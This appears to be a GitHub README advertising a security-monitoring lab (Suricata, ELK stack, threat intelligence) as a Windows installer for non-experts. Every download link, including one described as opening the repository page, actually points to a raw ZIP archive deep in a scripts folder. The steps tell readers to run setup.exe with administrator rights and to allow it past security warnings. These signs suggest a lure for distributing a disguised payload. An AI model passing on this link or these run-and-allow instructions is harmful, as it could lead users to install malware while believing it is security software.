# 🛡️ soc-detection-threat-intel-lab - Simple Security Monitoring Setup

[![Download Now](https://img.shields.io/badge/Download-soc--detection--threat--intel--lab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip)

## ⚙️ What is soc-detection-threat-intel-lab?

This application helps you monitor your systems for security threats. It uses tools like Suricata IDS (which watches for bad network activity), the ELK stack (Elasticsearch, Logstash, Kibana) to collect and show data, and threat intelligence to identify known attackers. It found 8 harmful IP addresses using custom rules and adds extra details automatically.

This setup is ideal for businesses or individuals wanting to keep an eye on possible cyber attacks without deep technical skills.

## 🖥️ System Requirements

- Windows 10 or newer (64-bit)
- At least 4 GB of RAM (8 GB recommended)
- 10 GB free disk space
- Internet connection for updates and threat intelligence
- Administrator rights on your computer for installation

## 📥 Download and Install 🔽

You need to visit the GitHub page below to get the full setup files and instructions.

[![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip)

### Step 1: Open the download page

Go to the link above. It will bring you to the software’s GitHub repository where you can get all the files.

### Step 2: Find the release or main files

On the GitHub page, look for a section called "Releases" or a folder with the latest version. The file you want might be a ZIP file or an installer program (.exe).

### Step 3: Download the files

Click on the file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.

### Step 4: Unpack the files

If your download is a ZIP file, right-click it and choose "Extract All" to unzip the contents.

### Step 5: Run the setup

Look for an installer file (for example, `setup.exe`) inside the extracted folder. Double-click it to start. You may see a warning; choose to allow the app to run.

### Step 6: Follow the installer prompts

The installer will guide you step-by-step. Choose the default options if you're unsure. This will install the Suricata IDS, ELK Stack components, and the integration needed for threat intelligence.

## 🚀 Starting the Application

### Step 1: Launch the program

After installation finishes, find **soc-detection-threat-intel-lab** in your Start menu or desktop.

### Step 2: Initial setup wizard

The first time you open it, a setup wizard will appear. This wizard will:

- Guide you through connecting Suricata IDS to your network adapter.
- Help configure ELK Stack components (Elasticsearch, Logstash, and Kibana).
- Set up connections for threat intelligence feeds.

Just follow the instructions and accept the default suggestions if you do not know what to change.

### Step 3: Start monitoring

After setup completes, the application will begin watching network traffic. It looks for suspicious activity using built-in rules and your custom rules.

### Step 4: Check alerts and reports

Open the Kibana dashboard through the application interface. You will see alerts for detected threats, including 8 malicious IP addresses already found by the setup.

The dashboard updates in real time and lets you explore logs and events.

## 🔧 Configuration Tips

- To add your own detection rules, place your rule files in the `suricata/rules` folder inside the installation directory.
- Use Kibana's Search bar to filter logs by IP address, date, or alert type.
- Logstash configuration files are in the `logstash/config` folder if you need to customize data processing.
- Keep the application updated by downloading the newest files from the GitHub link regularly.

## 📚 About the Components

### Suricata IDS

This tool monitors network traffic and detects attacks in real time. It uses detection rules to spot patterns that match known threats.

### ELK Stack

- **Elasticsearch:** Stores and indexes all logged data.
- **Logstash:** Processes and transforms data before storing.
- **Kibana:** Visualizes logs and alerts, making it easy to explore threats.

### Threat Intelligence Integration

This feature adds context to detected threats by matching them against databases of known bad actors. It helps identify attackers quicker.

## ❓ Troubleshooting

- If the installer fails, try running it as administrator (right-click and select "Run as administrator").
- Make sure no other security software blocks Suricata or ELK components.
- If Kibana does not show data, check if Elasticsearch and Logstash services are running.
- Restart the application or your computer if something stops working.

## 🗂️ File and Folder Structure

- `/suricata/` — Contains IDS rules and configurations
- `/elk/` — ELK Stack configuration files and logs
- `/threat-intel/` — Data integration scripts and feed setup
- `/docs/` — User manuals and additional guidance

## 🔄 Updating the Software

Return to the main GitHub page often to check for new releases. Download the latest files and run setup again to keep your environment current with new detections and fixes.

## 📞 Getting Help

Check the `docs` folder for user guides and FAQs. For technical issues, use the "Issues" tab on the GitHub repository to read or report problems.

---

[Download soc-detection-threat-intel-lab](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip) to start securing your systems today.